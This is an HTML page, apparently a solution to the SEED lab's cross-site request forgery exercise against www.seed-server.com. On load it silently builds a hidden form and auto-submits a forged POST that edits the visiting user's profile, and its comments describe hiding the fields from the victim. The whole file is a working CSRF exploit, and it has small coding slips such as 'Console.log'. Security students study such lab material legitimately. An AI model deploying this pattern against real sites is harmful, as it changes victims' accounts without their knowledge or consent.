<html>
<head>
<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding">
</head>
<body>
<h1>This page forges an HTTP POST request.</h1>
<script type="text/javascript">

function forge_post()
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
	Console.log("Receive response");
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200){
            Console.log(xmlHttp.response);
           var fields;
    
            // The following are form entries need to be filled out by attackers.
            // The entries are made hidden, so the victim won't be able to see them.
            fields += "<input type='hidden' name='name' value='alice'>";
            fields += "<input type='hidden' name='briefdescription' value='Bob is my hero1'>";
            fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
            fields += "<input type='hidden' name='guid' value='56'>";
        //    fields += "<input type='hidden' name='guid' value='57'>";
            // Create a <form> element.
            var p = document.createElement("form");

            // Construct the form
            p.action = "http://www.seed-server.com/action/profile/edit";
            p.innerHTML = fields;
            p.method = "post";

            // Append the form to the current page.
            document.body.appendChild(p);

            // Submit the form
            p.submit();
        }
            
    }
    xmlHttp.open("GET", "http://www.seed-server.com/", true); // true for asynchronous 
    xmlHttp.send("");
    
}


// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post();}
</script>
</body>
</html>
